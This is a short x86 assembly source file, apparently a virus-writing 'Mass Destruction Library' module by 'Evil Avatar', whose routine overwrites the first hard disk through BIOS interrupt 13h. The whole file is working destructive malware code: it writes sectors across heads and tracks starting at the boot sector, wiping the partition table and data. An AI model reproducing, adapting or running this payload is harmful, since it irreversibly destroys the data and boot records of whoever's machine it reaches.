

;RIP_HD - module for Mass Destruction Library
;written by Evil Avatar
; Destruye el HD

rip_hd:
        xor dx, dx            ;clear dx
rip_hd1:        
        mov cx, 1             ;track 0, sector 1
        mov ax, 311h          ;17 secs per track (hopefully!)
        mov dl, 80h
        mov bx, 5000h
        mov es, bx
        int 13h               ;kill 17 sectors
        jae rip_hd2           
        xor ah, ah
        int 13h               ;reset disks if needed
rip_hd2:
        inc dh                ;increment head number
        cmp dh, 4             ;if head number is below 4 then
        jb rip_hd1            ;go kill another 17 sectors
        inc ch                ;increase track number and
        jmp rip_hd            ;do it again

